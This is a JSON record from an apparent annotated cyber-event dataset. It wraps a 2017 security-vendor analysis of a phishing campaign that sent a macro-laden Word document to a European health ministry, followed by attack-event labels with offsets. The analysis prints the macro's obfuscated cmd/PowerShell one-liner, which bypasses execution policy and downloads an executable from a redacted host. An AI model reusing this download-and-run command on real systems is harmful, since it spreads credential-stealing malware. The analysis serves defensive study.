{"content": "Cyberthreats are a constant risk and affect public administrations significantly. So much so that they have become a powerful instrument of aggression against public entities and citizens. They can lead to a serious deterioration in the quality of service, and also, above all, to data leaks concerning everything from personal information to state secrets. The combination of new technologies and the increase in the complexity of attacks, as well as the professionalization of cybercriminals, is highly dangerous. Last December, a large-scale spam campaign spanning more than ten countries was carried out, and specifically targeted a major European ministry. The attack, via phishing, was highly advanced and combined social engineering tactics with a powerful Trojan. The attack is sent by email with an attached Word document. At first, we suspected that it was a targeted attack, since the message came, supposedly, from a healthcare company and the recipient was an employee of the Ministry of Health in a European country. The present analysis describes the technical features of the harmful code found in the macro of the Word document. The goal of the macro was to download and run another malicious component. Below are shown a few static properties of the analyzed files. The hash of the Word document is the following: MD5: \u00a0B480B7EFE5E822BD3C3C90D818502068 SHA1: \u00a0861ae1beb98704f121e28e57b429972be0410930 According to the document\u2019s metadata, the creation date was 2016-12-19. The malicous code\u2019s signature, downloaded by Word, is the following: MD5: \u00a03ea61e934c4fb7421087f10cacb14832 SHA1: \u00a0bffb40c2520e923c7174bbc52767b3b87f7364a9 The Word document gets to the victim\u2019s computer by way of a spam email coming from a healthcare company. The text tricks the recipient into beleiving that the content is protected and needs to run the macro in order to gain access to it. According to the data recovered by Panda Security\u2019s Collective Intelligence, this spam campaign took place on December 19, 2016 and affected several countries. Interactions with the infected system The basic function of the macro consists in downloading and running another malicious code from a URL embedded in the macro itself. Also, the macro is designed to run immediately upon being opened. Part of the obfuscated code contained in the macro Once the macro is running, the Word doc runs the following command in the system: cmd.exe /c pOWeRsHELL.EXe\u00a0\u00a0 -eXecUTIONpolICy\u00a0\u00a0 BYPAss\u00a0 -noPrOfIlE -winDowsTyle\u00a0\u00a0\u00a0 hidDEN (NeW-oBjECt\u00a0\u00a0\u00a0 sYstEm.NeT.webcLiENt).DOWNloAdFILE(\u2018http://xxxxxxxxxxxx.com/13obCpHRxA1t3rbMpzh7iy1awHVm1MzNTX.exe\u2019,\u2019C:\\Users\\??? ?\\AppData\\Roaming.eXe\u2019 The system symbol (cmd.exe) runs the powershell with two embedded commands going through parameters: Thanks to the data obtained by the Intelligence Collective at Panda Security, we know that the last malicious code to be distributed by this campaign is a variant of the Dyreza family. Panda\u2019s clients were protected proactively, without need of signatures or updates. The purpose of the malicious code is to steal credentials from browsers and add the compromised machine to bot network. It then waits for commands from the Command & Control Server. These commands come from the cybercriminals that operate it, and is able to download further new malware and carry out all kinds of malicious actions. Digitization in Public Administration leads to the exponential growth of the creation, storage and management of huge quantities of confidential data \u2014 data that does not allow for a single oversight", "sourcefile": "428.txt", "cyberevent": {"hopper": [{"index": 0, "events": [{"nugget": {"startOffset": 772, "index": "T24", "endOffset": 782, "text": "The attack"}, "index": "E8", "type": "Attack", "subtype": "Phishing", "realis": "Generic"}]}, {"index": 1, "events": [{"index": "E2", "type": "Attack", "realis": "Generic", "nugget": {"startOffset": 678, "index": "T3", "endOffset": 686, "text": "phishing"}, "argument": [{"index": "T5", "text": "social engineering tactics with a powerful Trojan", "endOffset": 770, "role": {"CAPEC-Meta": "Information Elicitation", "type": "Attack-Pattern", "confidence": 0.9251241385936737}, "startOffset": 721, "type": "Capabilities"}], "subtype": "Phishing"}]}, {"index": 2, "events": [{"index": "E1", "type": "Attack", "realis": "Generic", "nugget": {"startOffset": 281, "index": "T1", "endOffset": 291, "text": "data leaks"}, "argument": [{"index": "T2", "text": "personal information", "endOffset": 339, "role": {"type": "Compromised-Data"}, "startOffset": 319, "type": "PII"}, {"index": "T20", "text": "state secrets", "endOffset": 356, "role": {"type": "Compromised-Data"}, "startOffset": 343, "type": "Data"}], "subtype": "Databreach"}]}, {"index": 3, "events": [{"nugget": {"startOffset": 662, "index": "T21", "endOffset": 672, "text": "The attack"}, "index": "E6", "type": "Attack", "subtype": "Phishing", "realis": "Generic"}]}, {"index": 4, "events": [{"index": "E3", "type": "Attack", "realis": "Generic", "nugget": {"startOffset": 1718, "index": "T8", "endOffset": 1729, "text": "coming from"}, "argument": [{"index": "T9", "text": "a healthcare company", "endOffset": 1750, "role": {"type": "Trusted-Entity"}, "startOffset": 1730, "type": "Organization"}, {"index": "T11", "text": "The Word document", "endOffset": 1664, "role": {"type": "Trusted-Entity"}, "startOffset": 1647, "type": "File"}, {"index": "T25", "text": "gets to the victim\u2019s computer", "endOffset": 1694, "role": {"CAPEC-Meta": "Shared Data Manipulation", "type": "Attack-Pattern", "confidence": 0.8788486123085022}, "startOffset": 1665, "type": "Capabilities"}, {"index": "T7", "text": "a spam email", "endOffset": 1717, "role": {"type": "Tool"}, "startOffset": 1705, "type": "File"}], "subtype": "Phishing"}]}, {"index": 5, "events": [{"index": "E7", "type": "Attack", "realis": "Generic", "nugget": {"startOffset": 783, "index": "T22", "endOffset": 790, "text": "is sent"}, "argument": [{"index": "T4", "text": "email", "endOffset": 799, "role": {"type": "Tool"}, "startOffset": 794, "type": "File"}, {"index": "T6", "text": "an attached Word document", "endOffset": 830, "role": {"type": "Tool"}, "startOffset": 805, "type": "File"}], "subtype": "Phishing"}]}, {"index": 6, "events": [{"index": "E4", "type": "Attack", "realis": "Generic", "nugget": {"startOffset": 1761, "index": "T10", "endOffset": 1767, "text": "tricks"}, "argument": [{"index": "T12", "text": "the recipient", "endOffset": 1781, "role": {"type": "Victim"}, "startOffset": 1768, "type": "Person"}, {"index": "T15", "text": "gain access", "endOffset": 1877, "role": {"type": "Purpose", "subtype": "Unauthorized access", "confidence": 0.9450717270374298}, "startOffset": 1866, "type": "Purpose"}, {"index": "T13", "text": "The text", "endOffset": 1760, "role": {"type": "Tool"}, "startOffset": 1752, "type": "File"}, {"index": "T14", "text": "run the macro", "endOffset": 1853, "role": {"CAPEC-Meta": "Privilege Abuse", "type": "Attack-Pattern", "confidence": 0.9248950779438019}, "startOffset": 1840, "type": "Capabilities"}], "subtype": "Phishing"}]}, {"index": 7, "events": [{"index": "E5", "type": "Attack", "realis": "Generic", "nugget": {"startOffset": 3064, "index": "T16", "endOffset": 3069, "text": "steal"}, "argument": [{"index": "T17", "text": "credentials", "endOffset": 3081, "role": {"type": "Compromised-Data"}, "startOffset": 3070, "type": "PII"}, {"index": "T18", "text": "the malicious code", "endOffset": 3057, "role": {"type": "Tool"}, "startOffset": 3039, "type": "File"}, {"index": "T23", "external_reference": {"wikidataid": "Q22906936"}, "endOffset": 3095, "role": {"type": "Victim"}, "text": "browsers", "startOffset": 3087, "type": "Software"}], "subtype": "Databreach"}]}]}, "info": {"title": "Malware Capable of Paralyzing an Entire Ministry Neutralized", "date": "2017_01_31", "type": "text", "link": "http://www.pandasecurity.com/mediacenter/pandalabs/dangerous-malware-neutralized/"}}